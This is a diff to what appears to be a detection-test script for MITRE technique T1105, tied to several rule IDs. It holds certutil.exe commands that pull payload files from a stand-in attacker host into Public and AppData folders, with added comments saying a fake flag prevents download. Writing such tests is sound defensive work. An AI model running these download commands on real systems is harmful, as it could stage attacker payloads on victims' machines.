@@ -2,10 +2,10 @@
 # Technique: T1105 (Ingress Tool Transfer)
 
 # 1) Download into Public (fires 996001 + 996002 + 996004)
-certutil.exe  -urlcache -fake https://attacker.local/payload.bin C:\\Users\\Public\\payload.bin
+certutil.exe  -urlcache -fake https://attacker.local/payload.bin C:\\Users\\Public\\payload.bin (Fake flag to test command without downloading anything)
 
 # 2) Download into AppData\Roaming (fires 996001 + 996002 + 996004)
-certutil.exe -urlcache -fake http://attacker.local/payload2.bin C:\Users\max\AppData\Roaming\payload2.bin
+certutil.exe -urlcache -fake http://attacker.local/payload2.bin C:\Users\max\AppData\Roaming\payload2.bin (Same fake flag to test command without downloading anything)
 
 # Purpose:
 # Simulates an attacker dropping tools or payloads into user-writable directories
